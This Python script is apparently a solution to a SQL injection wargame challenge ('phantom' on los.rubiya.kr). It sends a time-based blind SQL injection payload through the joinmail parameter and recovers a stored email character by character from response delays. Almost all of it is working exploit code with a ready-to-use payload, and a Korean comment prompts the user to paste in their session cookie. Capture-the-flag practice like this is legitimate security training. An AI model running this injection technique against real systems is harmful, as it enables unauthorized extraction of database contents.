import requests
import time

for i in range(29):
    #for q in range(ord('.'),ord('z')+1):
    for q in range(46,127):
        url = 'https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php' + \
        "?joinmail=1'),(0,'175.124.214.81',if(ord(substr((select email from prob_phantom as dummy where no=1),"+ str(i)+ ",1))="+ str(q) +",sleep(2),'F'))%23"

        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'YOUR COOKIE VALUE'} #본인의 cookie 값을 코드에 입력

        start = time.time()
        html = requests.get(url, headers=headers, cookies=cookies)

        if int(time.time() - start) >= 2:
            print(chr(q), end='')
            break


